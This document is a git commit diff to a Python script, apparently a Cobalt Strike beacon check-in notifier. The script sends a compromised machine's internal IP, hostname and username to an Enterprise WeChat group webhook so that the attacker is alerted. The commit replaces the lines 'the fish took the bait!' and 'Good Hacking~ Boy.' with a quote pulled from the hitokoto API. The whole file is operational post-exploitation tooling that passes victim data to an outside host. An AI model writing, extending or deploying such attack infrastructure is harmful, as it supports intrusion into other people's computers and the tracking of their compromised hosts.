8e968cd320495a078ae0df04c522218ae019e8f9
xue <nidhog@qq.com>
2022-03-14 15:56:03 +0800

    加入一言api

--- cs-wecom.py
+++ cs-wecom.py
@@ -1,12 +1,12 @@
 #coding: utf-8
 import argparse
 import requests
-import random
-import string
 import json
 
-key = 'xxxxxxxxx36位的一串'  
 # 填入企业机器人hook地址
+key = 'xxxxxxxxx36位的一串'
+
+# 请求参数
 parser = argparse.ArgumentParser(description='Beacon Info')
 parser.add_argument('--computername')
 parser.add_argument('--internalip')
@@ -17,21 +17,21 @@ computername = args.computername
 internalip = args.internalip
 username = args.username
 
-ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))
+# 一言api接口
+r = requests.get('https://v1.hitokoto.cn')
+yiyan =json.loads(r.text).get('hitokoto') + '—— ' + json.loads(r.text).get('from')
 
 content = """
 <font color=\"warning\">CobaltStrike 上线提醒</font>\n
 
-**鱼上钩了 ！**\n
+**「{}」**\n
 
 IP: <font color="comment">{}</font>\n
 
 主机名: <font color="comment">{}</font>\n
 
 用户名: <font color="comment">{}</font>\n
-
-**Good Hacking~ Boy.**
-""".format(internalip, computername, username)
+""".format(yiyan, internalip, computername, username)
 
 # print(content)
 url = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key={}".format(key)
